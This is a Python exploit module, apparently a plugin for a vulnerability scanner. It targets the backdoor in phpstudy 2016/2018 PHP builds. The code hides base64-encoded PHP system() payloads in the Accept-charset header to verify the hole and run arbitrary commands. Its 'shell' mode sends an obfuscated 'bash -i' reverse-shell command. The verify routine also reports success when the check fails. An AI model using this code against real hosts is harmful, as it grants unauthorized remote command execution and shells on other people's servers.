# !/usr/bin/env python
# coding=utf-8
# ---- ---- ---- ----
# @Author: Guoke324 
# @Date: 2021-08-26 10:21:08
# @Email: querysoft2019@outlook.com
# @LastEditTime: 2021-08-26 10:21:30

import base64
import requests
import http.client
http.client.HTTPConnection._http_vsn = 10 
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'


def vuln_info():
    info = {
        "vulID":"0004",
        "version":"1.0",
        "author":"Guoke324",
        "createDate":"2021-08-26",
        "updateDate":"2021-08-26",
        "vuln_referer":"https://blog.csdn.net/qq_41770175/article/details/101277851",
        "appName":"phpstudy",
        "appversion":"phpstudy 2016版PHP5.4,phpstudy2018版php-5.2.17和php-5.4.45",
        "vuln_name":"phpstudy 后门",
        "vuln_calss":"命令执行",
        "vuln_level":"高危",
        "vuln_description":"漏洞描述:代码执行",
        "vuln_identifier":"漏洞编号：无",
        "exist_poc":"1",
        "exist_exp":"1"
    }
    return info

HEADERS_1 = {
    "Accept-charset":"ZWNobyBzeXN0ZW0oImVjaG8gcGhwc3R1ZHl0ZXN0Iik7",
    "Accept-Encoding":"gzip,deflate"
}


def vuln_verify(url, head, ctime):
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        HEADERS = {**HEADERS_1, **head}
        req = requests.get(url, headers=HEADERS, timeout =ctime)
        if 'phpstudytest' in req.text:
            result["Result_Info"] = "漏洞存在"
            result['Result'] = True
        else:
            result["Result_Info"] = "漏洞不存在或未知"
            result['Result'] = True           
    except Exception as e:
        result["Error_Info"] = str(e)
    return result

def vuln_attack(url, head, ctime, command, exp_type='cmd'):
    try:
        result = {"Result":False,"Result_Info":"info","target":"url","vuln_name":"vuln_name","path":"poc_name","level":"level","Error_Info":""}
        if exp_type == 'cmd':
            cmd = 'system("{}");'.format(command)
            print(cmd)
            HEADERS_1['Accept-charset'] = base64.b64encode(cmd.encode()).decode()
            HEADERS = {**HEADERS_1, **head}
            req = requests.get(url, headers=HEADERS, timeout = ctime)
            if req.status_code == 200:
                result["Result_Info"] = req.text
                result['Result'] = True
            else:
                result["Error_Info"] = '执行命令失败，请使用其他工具，在下无能为力！'
        if exp_type == "shell":
            cmd = 'echo system("{}");'.format("bash -c {echo,%s}|{base64,-d}|{bash,-i}" % str(base64.b64encode(command.encode()).decode()))
            HEADERS_1['Accept-charset'] = base64.b64encode(cmd.encode()).decode()
            HEADERS = {**HEADERS_1, **head}
            req = requests.get(url, headers=HEADERS, timeout=ctime, verify=False)
            if req.status_code == 200:
                result["Result_Info"] = "shell 反弹成功"
                result['Result'] = True
            else:
                result["Error_Info"] = '执行命令失败，请使用其他工具，在下无能为力！'
    except Exception as e:
        result["Error_Info"] = str(e)
    return result
